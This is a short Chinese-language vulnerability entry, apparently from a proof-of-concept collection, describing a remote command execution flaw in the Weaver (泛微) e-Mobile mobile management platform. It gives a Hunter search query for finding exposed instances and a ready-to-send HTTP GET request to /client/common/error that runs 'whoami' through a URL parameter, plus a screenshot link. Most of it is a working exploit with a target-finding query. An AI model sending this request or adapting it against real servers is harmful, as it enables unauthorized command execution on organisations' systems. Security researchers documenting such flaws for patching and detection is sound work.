# 泛微e-Mobile移动管理平台error存在远程命令执行漏洞

泛微e-Mobile移动管理平台是一款由泛微软件开发的企业移动办公解决方案。它提供了一系列的功能和工具，使企业员工能够通过移动设备随时随地地进行办公和协作。泛微e-Mobile 移动管理平台error在远程命令执行漏洞。

## hunter
```javascript
app.name="泛微 e-Mobile 移动管理平台"
```

## poc
```plain
GET /client/common/error?a=whoami HTTP/1.1
Host: 
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:121.0) Gecko/20100101 Firefox/121.0
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
Connection: close
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Encoding: gzip, deflate
```

![](https://cdn.nlark.com/yuque/0/2024/png/1622799/1728540551926-c7e783ce-3810-40b8-a311-536332c7ccab.png)

